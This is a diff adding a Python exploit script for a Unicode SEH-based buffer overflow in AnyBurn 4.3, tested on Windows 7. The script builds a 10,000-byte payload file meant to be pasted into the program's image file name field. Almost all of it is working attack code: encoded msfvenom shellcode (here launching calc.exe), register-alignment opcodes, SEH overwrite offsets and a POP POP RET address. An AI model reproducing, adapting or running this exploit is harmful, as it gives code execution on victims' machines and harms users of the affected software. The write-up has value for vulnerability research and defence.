@@ -1,0 +1,128 @@
+#!/usr/bin/python
+# Exploit Title:    Anyburn 4.3 - 'Copy disc to image file' Buffer Overflow - (UNICODE)(SEH)
+# Version:          4.3
+# Date:             07-03-2019
+# Author:           Hodorsec (hodorsec@protonmail.com / hodor@hodorsec.com)
+# Vendor Homepage:  http://www.anyburn.com/
+# Software Link:    http://www.anyburn.com/download.php
+# Tested on:        Win7 x86 SP1 build 7601
+# Caveats:          - Heavy character expansion from byte range 0x80 until 0x9f. I've mapped the character translation for convenience.
+#                   - Modify 'crash_nseh' and 'ret_jmp' variable offsets for different OS'es / servicepacks
+#
+# Character expansion mapping
+# 80 --> 20ac, 81 --> 81
+# 82 --> 201a, 83 --> 0192
+# 84 --> 201e, 85 --> 2026
+# 86 --> 2020, 87 --> 2021
+# 88 --> 02c6, 89 --> 2030
+# 8a --> 0160, 8b --> 2039
+# 8c --> 0152, 8d --> 8d
+# 8e --> 017d, 8f --> 8f
+# 90 --> 90  , 91 --> 2018
+# 92 --> 2019, 93 --> 201c
+# 94 --> 201d, 95 --> 2022
+# 96 --> 2013, 97 --> 2014
+# 98 --> 02dc, 99 --> 2122
+# 9a --> 0161, 9b --> 203a
+# 9c --> 0153, 9d --> 9d
+# 9e --> 017e, 9f --> 0178
+# 
+# PoC
+# 1.) Generate sploit_anyBURN_seh_unicode.txt, copy the contents to clipboard
+# 2.) In the application, open 'Copy disc to image file'
+# 3.) Paste the contents of the TXT file in 'Image file name'
+# 4.) Click "Create Now" and watch Anyburn BURN!
+
+import sys, struct
+
+filename = "sploit_anyburn_seh_unicode.txt"
+
+# Maximum length
+maxlen = 10000
+
+# Shellcode
+# msfvenom -p windows/exec cmd=calc.exe -e x86/unicode_mixed -f python -b "\x00\x0a\x0d" -v shellcode bufferregister=eax
+# Size 512
+shellcode =  ""
+shellcode += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
+shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
+shellcode += "\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
+shellcode += "\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
+shellcode += "\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
+shellcode += "\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
+shellcode += "\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
+shellcode += "\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
+shellcode += "\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
+shellcode += "\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
+shellcode += "\x75\x34\x4a\x42\x79\x6c\x39\x58\x35\x32\x6d\x30"
+shellcode += "\x4b\x50\x6b\x50\x73\x30\x64\x49\x4b\x35\x4e\x51"
+shellcode += "\x35\x70\x61\x54\x74\x4b\x6e\x70\x6e\x50\x64\x4b"
+shellcode += "\x61\x42\x7a\x6c\x72\x6b\x62\x32\x6d\x44\x64\x4b"
+shellcode += "\x44\x32\x6b\x78\x5a\x6f\x45\x67\x6f\x5a\x6b\x76"
+shellcode += "\x4d\x61\x49\x6f\x34\x6c\x4f\x4c\x43\x31\x71\x6c"
+shellcode += "\x39\x72\x4e\x4c\x4b\x70\x49\x31\x38\x4f\x4c\x4d"
+shellcode += "\x6a\x61\x76\x67\x67\x72\x58\x72\x31\x42\x62\x37"
+shellcode += "\x64\x4b\x50\x52\x7a\x70\x32\x6b\x4f\x5a\x4f\x4c"
+shellcode += "\x42\x6b\x70\x4c\x6b\x61\x34\x38\x7a\x43\x51\x38"
+shellcode += "\x6d\x31\x78\x51\x6f\x61\x52\x6b\x30\x59\x6f\x30"
+shellcode += "\x4b\x51\x79\x43\x72\x6b\x4f\x59\x5a\x78\x68\x63"
+shellcode += "\x6c\x7a\x30\x49\x62\x6b\x4e\x54\x42\x6b\x6b\x51"
+shellcode += "\x4a\x36\x4c\x71\x6b\x4f\x44\x6c\x46\x61\x78\x4f"
+shellcode += "\x4c\x4d\x69\x71\x56\x67\x6c\x78\x57\x70\x63\x45"
+shellcode += "\x59\x66\x6a\x63\x51\x6d\x4a\x58\x4d\x6b\x71\x6d"
+shellcode += "\x4e\x44\x52\x55\x4b\x34\x42\x38\x54\x4b\x4e\x78"
+shellcode += "\x6b\x74\x79\x71\x79\x43\x53\x36\x74\x4b\x4a\x6c"
+shellcode += "\x50\x4b\x34\x4b\x31\x48\x4d\x4c\x69\x71\x57\x63"
+shellcode += "\x72\x6b\x4a\x64\x74\x4b\x69\x71\x78\x50\x31\x79"
+shellcode += "\x50\x44\x6d\x54\x6c\x64\x71\x4b\x51\x4b\x70\x61"
+shellcode += "\x72\x39\x70\x5a\x30\x51\x39\x6f\x6b\x30\x61\x4f"
+shellcode += "\x31\x4f\x6f\x6a\x32\x6b\x4d\x42\x4a\x4b\x72\x6d"
+shellcode += "\x4f\x6d\x51\x5a\x39\x71\x42\x6d\x75\x35\x75\x62"
+shellcode += "\x4d\x30\x59\x70\x4d\x30\x70\x50\x33\x38\x6e\x51"
+shellcode += "\x52\x6b\x42\x4f\x53\x57\x6b\x4f\x46\x75\x55\x6b"
+shellcode += "\x6a\x50\x46\x55\x33\x72\x4f\x66\x62\x48\x66\x46"
+shellcode += "\x72\x75\x65\x6d\x43\x6d\x39\x6f\x67\x65\x6d\x6c"
+shellcode += "\x39\x76\x61\x6c\x4a\x6a\x31\x70\x59\x6b\x79\x50"
+shellcode += "\x74\x35\x49\x75\x35\x6b\x6f\x57\x6e\x33\x72\x52"
+shellcode += "\x62\x4f\x70\x6a\x39\x70\x42\x33\x39\x6f\x49\x45"
+shellcode += "\x42\x43\x4f\x71\x52\x4c\x70\x63\x4c\x6e\x30\x65"
+shellcode += "\x51\x68\x51\x55\x49\x70\x41\x41"
+
+# Align reg EBP to RET into EAX
+# EBP = 0x04f6acb8, Buffer = 0x04f6b70a, Buffer - EBP = 0x0a52 --> 0x0b00
+align_ebp = (   
+                "\x73"              # Padding
+                "\x55"              # PUSH EBP
+                "\x73"              # Padding
+                "\x58"              # POP EAX
+                "\x73"              # Padding
+                "\x05\x0f\x11"      # "\x05\x00\x0f\x00\x11" # 05000f0011 add eax,0x11000f00 --\
+                "\x73"              # Padding                                                   |--> Adds 0x0b00 bytes
+                "\x2d\x04\x11"      # "\x2d\x00\x04\x00\x11" # 2d00040011 sub eax,0x11000400 --/
+                "\x73"              # Padding
+                "\x50"              # PUSH EAX
+                "\x73"              # Padding
+                "\xc3"              # RET
+)
+
+# Offsets
+crash_nseh = 9197                                                   # NSEH, might be different on other Windows version/SP
+crash_seh = crash_nseh + 4                                          # SEH
+ret_jmp = 87                                                        # Offset for which the 'align_ebp' instructions land
+
+# Variables
+prefix = "\x73" * ret_jmp                                           # Padding
+prefix += shellcode                                                 # UNICODE encoded shellcode
+prefix += "\x73" * (crash_nseh - len(prefix))                       # Additional padding to reach NSEH
+nseh = "\x83\x43"                                                   # 0x83 Expands to 0x0192 --> XCHG EAX,EDX # Expanded instruction in SEH now does get executed due to swapped regs
+seh = "\x95\x47"                                                    # 0x00470095 Expands to 0x00472022 --> # POP POP RET # AnyBurn.exe
+suffix = align_ebp                                                  # Align registers to jump to beginning of buffer
+suffix += "\x73" * (maxlen - len(prefix + nseh + seh + suffix))     # Padding
+
+# Crafting payload
+payload = prefix + nseh + seh + suffix
+
+# Create file
+f = open(filename, 'wb')
+f.write(payload)
+f.close()
